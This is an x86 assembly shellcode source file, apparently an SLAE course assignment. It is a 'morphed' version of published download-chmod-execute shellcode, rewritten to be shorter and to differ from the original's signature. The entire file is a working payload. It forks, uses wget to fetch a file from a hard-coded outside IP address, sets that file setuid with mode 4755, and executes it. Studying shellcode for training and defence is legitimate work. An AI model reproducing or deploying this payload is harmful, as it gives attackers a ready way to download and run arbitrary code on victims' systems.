```nasm
; SLAE Assignment 6: Download Chmod Execute (morphed)
; http://shell-storm.org/shellcode/files/shellcode-862.php
; Original Shellcode Length:	108
; Morphed Shellcode Length:		96


global _start
section .text
_start:
	push byte 0x2 		; #define __NR_fork 2
	pop eax 			; pid_t fork(void);			--> in child returns 0
	int 0x80 			; make a child
	jz short download 	; if this is a child, download

zzz:
	push byte 0x7 		; #define __NR_waitpid 7
	pop eax 			; pid_t wait(int *status);
	int 0x80 			; wait for the child (download)

chmod:
	push byte 0xf 		; #define __NR_chmod 15
	pop eax 			; int chmod(const char *path, mode_t mode);
	push edx
	push byte 0x62		; b
	mov ebx, esp 		; *path -> b
	push word 0x9ed 	; 4755 (octal)
	pop ecx 			; mode = 4755 
	int 0x80 			; chmod

execve:
	push byte 0xb 		; #define __NR_execve 11
	pop eax 			; int execve(const char *filename, char *const argv[], char *const envp[]);
	push byte 0x62 		; b
	mov ebx, esp 		; *filename -> b
	push edx 			; NULL
	mov edx, esp  		; *envp[] -> 0
	push ebx 			; put filename on the stack
	mov ecx, esp		; *argv[] -> b\0
	int 0x80

download:
	push 0xb			; #define __NR_execve 11
	pop eax				; int execve(const char *filename, char *const argv[], char *const envp[]);
	cdq 				; *envp[] -> 0
	push edx
	push 0x622f3832		; b/82
	push 0x2e333532		; .352
	push 0x2e303231		; .021
	push 0x2e383831		; .881
	mov ecx, esp		; *argv[] -> 188.120.253.28/b
	push edx
	push 0x74			; t
	push 0x6567772f		; egw/
	push 0x6e69622f		; nib/
	push 0x7273752f		; rsu/
	mov ebx, esp		; *filename -> /usr/bin/wget
	push edx
	push ecx
	push ebx
	mov ecx, esp		
	int 0x80 			; download
```
